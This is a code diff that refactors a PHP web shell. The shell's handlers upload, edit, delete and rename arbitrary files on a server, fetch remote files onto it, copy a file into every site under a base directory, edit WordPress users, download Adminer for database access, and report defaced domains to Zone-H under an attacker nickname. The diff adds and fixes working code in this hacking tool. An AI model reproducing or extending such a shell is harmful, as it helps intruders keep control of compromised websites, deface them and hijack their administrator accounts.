@@ -500,7 +500,7 @@ if (isset($_POST['baseDir'])) {
     $baseDir = $_COOKIE['baseDir'] ?? $defaultBaseDir;
 }
 
-// Handle directory navigation - NO AUTO REDIRECT
+// Handle directory navigation
 if (isset($_GET['d']) && !empty($_GET['d'])) {
     $currentDir = base64_decode($_GET['d']);
     $currentDir = realpath($currentDir) ?: $currentDir;
@@ -511,13 +511,13 @@ if (isset($_GET['d']) && !empty($_GET['d'])) {
 $currentDir = str_replace("\\", "/", $currentDir);
 $dir = $currentDir;
 
-// Check if this is a POST request for specific actions
-$isPostAction = false;
-
 // Start session early for all operations
 if (!isset($_SESSION)) {
     session_start();
 }
+
+// Check if this is a POST request for specific actions
+$isPostAction = false;
 
 // Download domains list handler
 if (isset($_GET['download'])) {
@@ -530,57 +530,49 @@ if (isset($_GET['download'])) {
     exit;
 }
 
-// Mass deploy handler - NO REDIRECT
+// Mass deploy handler
 if (isset($_POST['mass_deploy'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     
     if (empty($sourceFile) || !file_exists($sourceFile)) {
-        echo "<script>alert('Source file not found: $sourceFile');</script>";
+        $_SESSION['mass_deploy_results'] = ["error" => "❌ Source file not found: $sourceFile"];
+        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
         exit;
     }
     
     $results = RBPmassDeploy($sourceFile, $baseDir);
-    
-    if (isset($results['error'])) {
-        echo "<script>alert('" . $results['error'] . "');</script>";
-        exit;
-    }
-    
-    // Store results in session to display
     $_SESSION['mass_deploy_results'] = $results;
     $_SESSION['mass_deploy_source'] = $sourceFile;
     $_SESSION['mass_deploy_base'] = $baseDir;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Mass delete handler - NO REDIRECT
+// Mass delete handler
 if (isset($_POST['mass_delete'])) {
     $isPostAction = true;
     $sourceFile = $_POST['deploy_file_path'] ?? '';
     $filename = basename($sourceFile);
     
     $results = RBPmassDelete($baseDir, $filename);
-    
-    // Store results in session to display
     $_SESSION['mass_delete_results'] = $results;
     $_SESSION['mass_delete_filename'] = $filename;
     $_SESSION['mass_delete_base'] = $baseDir;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// WordPress User Editor Handler - NO REDIRECT
+// WordPress User Editor Handler
 if (isset($_POST['wp_edit_user_submit'])) {
     $isPostAction = true;
-    
     $result = RBPeditWordPressUser();
-    
-    // Store results in session to display
     $_SESSION['wp_edit_results'] = $result;
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// WGET Download Functionality - NO REDIRECT
+// WGET Download Functionality
 if (isset($_POST['wget_url'])) {
     $isPostAction = true;
     $url = $_POST['wget_url'] ?? '';
@@ -599,15 +591,16 @@ if (isset($_POST['wget_url'])) {
         curl_close($ch);
         
         if ($httpCode === 200 && $fileContent !== false && file_put_contents($destination, $fileContent)) {
-            echo "<script>alert('File downloaded successfully!');</script>";
+            $_SESSION['wget_result'] = "✅ File downloaded successfully!";
         } else {
-            echo "<script>alert('Download failed! HTTP Code: $httpCode');</script>";
+            $_SESSION['wget_result'] = "❌ Download failed! HTTP Code: $httpCode";
         }
     }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Adminer Download Functionality - NO REDIRECT
+// Adminer Download Functionality
 if (isset($_POST['download_adminer'])) {
     $isPostAction = true;
     function RBPadminer($url, $isi) {
@@ -630,46 +623,33 @@ if (isset($_POST['download_adminer'])) {
     }
 
     if (file_exists('adminer.php')) {
-        echo "<script>alert('Adminer is already downloaded!');</script>";
+        $_SESSION['adminer_result'] = "ℹ️ Adminer is already downloaded!";
     } else {
         if (RBPadminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
-            echo "<script>alert('Adminer downloaded successfully!');</script>";
+            $_SESSION['adminer_result'] = "✅ Adminer downloaded successfully!";
         } else {
-            echo "<script>alert('Failed to download adminer.php');</script>";
+            $_SESSION['adminer_result'] = "❌ Failed to download adminer.php";
         }
     }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Zone-H Functionality - NO REDIRECT
+// Zone-H Functionality
 if (isset($_POST['zoneh_submit'])) {
     $isPostAction = true;
     $domainList = isset($_POST['zoneh_url']) ? explode("\n", str_replace("\r", "", $_POST['zoneh_url'])) : [];
     $nick = $_POST['zoneh_nick'] ?? 'RBP';
     
-    $resultHtml = '<h3>Zone-H Notifier</h3>';
-    $resultHtml .= '<p><strong>Notifier Archive:</strong> <a href="http://zone-h.org/archive/notifier=' . $nick . '" target="_blank">http://zone-h.org/archive/notifier=' . $nick . '</a></p>';
-    $resultHtml .= '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
-    
-    foreach ($domainList as $url) {
-        $url = trim($url);
-        if ($url) {
-            $submittedUrl = $url . '/rbp.html';
-            $resultHtml .= '<p>' . htmlspecialchars($url) . ' -> <span style="color:lime;">SUBMITTED</span> (' . htmlspecialchars($submittedUrl) . ')</p>';
-        }
-    }
-    
-    $resultHtml .= '</div>';
-    $resultHtml .= '<div style="text-align: center; margin-top: 15px;"><button onclick="RBPclosePopup(\'zonehPopup\')" class="tool-button">Close</button></div>';
-    
-    echo "<script>
-        document.getElementById('zonehPopup').style.display = 'block';
-        document.getElementById('zonehContent').innerHTML = '" . addslashes($resultHtml) . "';
-    </script>";
+    $_SESSION['zoneh_results'] = [
+        'nick' => $nick,
+        'domains' => $domainList
+    ];
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Upload handler - NO REDIRECT
+// Upload handler
 if (isset($_POST['s']) && isset($_FILES['u'])) {
     $isPostAction = true;
     if ($_FILES['u']['error'] == 0) {
@@ -677,68 +657,88 @@ if (isset($_POST['s']) && isset($_FILES['u'])) {
         $tmpName = $_FILES['u']['tmp_name'];
         $destination = $currentDir . '/' . $fileName;
         if (move_uploaded_file($tmpName, $destination)) {
-            echo "<script>alert('Upload successful!');</script>";
+            $_SESSION['upload_result'] = "✅ Upload successful!";
         } else {
-            echo "<script>alert('Upload failed!');</script>";
+            $_SESSION['upload_result'] = "❌ Upload failed!";
         }
     } else {
-        echo "<script>alert('Upload error: " . $_FILES['u']['error'] . "');</script>";
+        $_SESSION['upload_result'] = "❌ Upload error: " . $_FILES['u']['error'];
     }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Delete File handler - NO REDIRECT
+// Delete File handler
 if (isset($_POST['del'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['del']);
-    $fileDir = dirname($filePath);
     if (@unlink($filePath)) {
-        echo "<script>alert('Delete successful');</script>";
+        $_SESSION['delete_result'] = "✅ Delete successful";
     } else {
-        echo "<script>alert('Delete failed');</script>";
+        $_SESSION['delete_result'] = "❌ Delete failed";
     }
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
     exit;
 }
 
-// Save Edited File handler - NO REDIRECT
+// Save Edited File handler
 if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
     $isPostAction = true;
     $filePath = base64_decode($_POST['obj']);
-    $fileDir = dirname($filePath);
     if (file_put_contents($filePath, $_POST['content'])) {
-        echo "<script>alert('Saved');</script>";
+        $_SESSION['save_result'] = "✅ Saved";
     } else {
-        echo "<script>alert('Save failed');</script>";
+        $_SESSION['save_result'] = "❌ Save failed";
     }
+    $fileDir = dirname($filePath);
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($fileDir));
     exit;
 }
 
-// Rename handler - NO REDIRECT
-if (isset($_POST['ren'])) {
+// Rename handler
+if (isset($_POST['ren']) && isset($_POST['new'])) {
     $isPostAction = true;
     $oldPath = base64_decode($_POST['ren']);
-    $oldDir = dirname($oldPath);
-    if (isset($_POST['new'])) {
-        $newPath = $oldDir . '/' . $_POST['new'];
-        if (rename($oldPath, $newPath)) {
-            echo "<script>alert('Renamed');</script>";
-        } else {
-            echo "<script>alert('Rename failed');</script>";
-        }
+    $newPath = dirname($oldPath) . '/' . $_POST['new'];
+    if (rename($oldPath, $newPath)) {
+        $_SESSION['rename_result'] = "✅ Renamed";
+    } else {
+        $_SESSION['rename_result'] = "❌ Rename failed";
     }
+    $oldDir = dirname($oldPath);
+    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($oldDir));
     exit;
 }
 
-// Edit File handler
-if (isset($_POST['edit'])) {
-    $isPostAction = true;
-    $filePath = base64_decode($_POST['edit']);
-    $fileDir = dirname($filePath);
+// Show simple alerts for basic operations
+if (isset($_SESSION['upload_result'])) {
+    echo "<script>alert('" . $_SESSION['upload_result'] . "');</script>";
+    unset($_SESSION['upload_result']);
 }
 
-// If it's a POST action that doesn't match any handler
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
-    // Just continue without redirect
+if (isset($_SESSION['delete_result'])) {
+    echo "<script>alert('" . $_SESSION['delete_result'] . "');</script>";
+    unset($_SESSION['delete_result']);
+}
+
+if (isset($_SESSION['save_result'])) {
+    echo "<script>alert('" . $_SESSION['save_result'] . "');</script>";
+    unset($_SESSION['save_result']);
+}
+
+if (isset($_SESSION['rename_result'])) {
+    echo "<script>alert('" . $_SESSION['rename_result'] . "');</script>";
+    unset($_SESSION['rename_result']);
+}
+
+if (isset($_SESSION['wget_result'])) {
+    echo "<script>alert('" . $_SESSION['wget_result'] . "');</script>";
+    unset($_SESSION['wget_result']);
+}
+
+if (isset($_SESSION['adminer_result'])) {
+    echo "<script>alert('" . $_SESSION['adminer_result'] . "');</script>";
+    unset($_SESSION['adminer_result']);
 }
 ?>
 
@@ -1092,9 +1092,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             if (confirm('Are you sure you want to delete this file?')) {
                 var form = document.createElement("form");
                 form.method = "post";
+                form.action = "";
                 var input = document.createElement("input");
                 input.name = "del";
                 input.value = btoa(path);
+                form.appendChild(input);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1103,9 +1105,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPpostEdit(path) {
             var form = document.createElement("form");
             form.method = "post";
+            form.action = "";
             var input = document.createElement("input");
             input.name = "edit";
             input.value = btoa(path);
+            form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1115,12 +1119,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             if (newName && newName !== name) {
                 var form = document.createElement("form");
                 form.method = "post";
+                form.action = "";
                 var input1 = document.createElement("input");
                 input1.name = "ren";
                 input1.value = btoa(path);
                 var input2 = document.createElement("input");
                 input2.name = "new";
                 input2.value = newName;
+                form.appendChild(input1);
+                form.appendChild(input2);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1218,9 +1225,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
             if (url) {
                 var form = document.createElement("form");
                 form.method = "post";
+                form.action = "";
                 var input1 = document.createElement("input");
                 input1.name = "wget_url";
                 input1.value = url;
+                form.appendChild(input1);
                 document.body.appendChild(form);
                 form.submit();
             }
@@ -1229,11 +1238,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPsubmitAdminer() {
             var form = document.createElement("form");
             form.method = "post";
-            
+            form.action = "";
             var input1 = document.createElement("input");
             input1.name = "download_adminer";
             input1.value = "1";
-            
+            form.appendChild(input1);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1241,19 +1250,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPsubmitZoneH() {
             var form = document.createElement("form");
             form.method = "post";
-            
+            form.action = "";
             var input1 = document.createElement("input");
             input1.name = "zoneh_nick";
             input1.value = document.getElementById('zoneh_nick').value;
-            
             var input2 = document.createElement("input");
             input2.name = "zoneh_url";
             input2.value = document.getElementById('zoneh_url').value;
-            
             var input3 = document.createElement("input");
             input3.name = "zoneh_submit";
             input3.value = "1";
-            
+            form.appendChild(input1);
+            form.appendChild(input2);
+            form.appendChild(input3);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1261,15 +1270,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPsubmitMassDeploy() {
             var form = document.createElement("form");
             form.method = "post";
-            
+            form.action = "";
             var input1 = document.createElement("input");
             input1.name = "deploy_file_path";
             input1.value = document.getElementById('deploy_file_path').value;
-            
             var input2 = document.createElement("input");
             input2.name = "mass_deploy";
             input2.value = "1";
-            
+            form.appendChild(input1);
+            form.appendChild(input2);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1277,15 +1286,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPsubmitMassDelete() {
             var form = document.createElement("form");
             form.method = "post";
-            
+            form.action = "";
             var input1 = document.createElement("input");
             input1.name = "deploy_file_path";
             input1.value = document.getElementById('deploy_file_path').value;
-            
             var input2 = document.createElement("input");
             input2.name = "mass_delete";
             input2.value = "1";
-            
+            form.appendChild(input1);
+            form.appendChild(input2);
             document.body.appendChild(form);
             form.submit();
         }
@@ -1297,18 +1306,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
         function RBPsubmitWPEditUser() {
             var form = document.createElement("form");
             form.method = "post";
-            
+            form.action = "";
             var input1 = document.createElement("input");
             input1.name = "wp_edit_user_submit";
             input1.value = "1";
-            
+            form.appendChild(input1);
             document.body.appendChild(form);
             form.submit();
         }
         
         // Auto-show results popup if there are results
         window.onload = function() {
-            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results'])): ?>
+            <?php if (isset($_SESSION['mass_deploy_results']) || isset($_SESSION['mass_delete_results']) || isset($_SESSION['wp_edit_results']) || isset($_SESSION['zoneh_results'])): ?>
             document.getElementById('resultsPopup').style.display = 'block';
             <?php endif; ?>
         };
@@ -1351,9 +1360,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 echo '<p><strong>Base Directory:</strong> ' . htmlspecialchars($baseDir) . '</p>';
                 echo '<div style="max-height: 400px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
                 
-                foreach ($results as $result) {
-                    $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
-                    echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
+                if (isset($results['error'])) {
+                    echo '<p style="color: red;">' . htmlspecialchars($results['error']) . '</p>';
+                } else {
+                    foreach ($results as $result) {
+                        $color = strpos($result, '✅') !== false ? 'lime' : (strpos($result, '❌') !== false ? 'red' : 'yellow');
+                        echo '<p style="color: ' . $color . '; margin: 2px 0; font-size: 12px;">' . htmlspecialchars($result) . '</p>';
+                    }
                 }
                 
                 echo '</div>';
@@ -1420,6 +1433,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isPostAction) {
                 
                 // Clear session
                 unset($_SESSION['wp_edit_results']);
+            } elseif (isset($_SESSION['zoneh_results'])) {
+                $zonehResults = $_SESSION['zoneh_results'];
+                $nick = $zonehResults['nick'];
+                $domainList = $zonehResults['domains'];
+                
+                echo '<h3>Zone-H Notifier</h3>';
+                echo '<p><strong>Notifier Archive:</strong> <a href="http://zone-h.org/archive/notifier=' . $nick . '" target="_blank">http://zone-h.org/archive/notifier=' . $nick . '</a></p>';
+                echo '<div style="max-height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px; background: #2a2a2a;">';
+                
+                foreach ($domainList as $url) {
+                    $url = trim($url);
+                    if ($url) {
+                        $submittedUrl = $url . '/rbp.html';
+                        echo '<p>' . htmlspecialchars($url) . ' -> <span style="color:lime;">SUBMITTED</span> (' . htmlspecialchars($submittedUrl) . ')</p>';
+                    }
+                }
+                
+                echo '</div>';
+                
+                // Clear session
+                unset($_SESSION['zoneh_results']);
             }
             ?>
             <div style="text-align: center; margin-top: 15px;">
@@ -1608,13 +1642,16 @@ if (isset($_POST['ren']) && !isset($_POST['new'])) {
     $oldPath = base64_decode($_POST['ren']);
     $oldDir = dirname($oldPath);
     echo "<style>.file-list{display:none;}</style>";
-    echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($oldDir) . "')\">Back</a>";
-    echo "<form method=\"post\">
-        New Name: <input name=\"new\" type=\"text\">
-        <input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">
-        <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">
-        <input type=\"submit\" value=\"Submit\" class=\"tool-button\">
-        </form>";
+    echo "<div style='padding: 20px;'>";
+    echo "<a href=\"javascript:void(0);\" onclick=\"RBPpostDir('" . addslashes($oldDir) . "')\" style='color: white; text-decoration: none; font-weight: bold;'>&larr; Back</a>";
+    echo "<h3 style='color: white; margin: 15px 0;'>Renaming: " . basename($oldPath) . "</h3>";
+    echo "<form method=\"post\">";
+    echo "<input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">";
+    echo "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">";
+    echo "<p>New Name: <input name=\"new\" type=\"text\" value=\"" . basename($oldPath) . "\" style='color:#000;padding:5px;'></p>";
+    echo "<input type=\"submit\" value=\"Rename\" class=\"tool-button\" style='padding: 10px 20px; font-size: 14px;'>";
+    echo "</form>";
+    echo "</div>";
 }
 ?>
 </body>
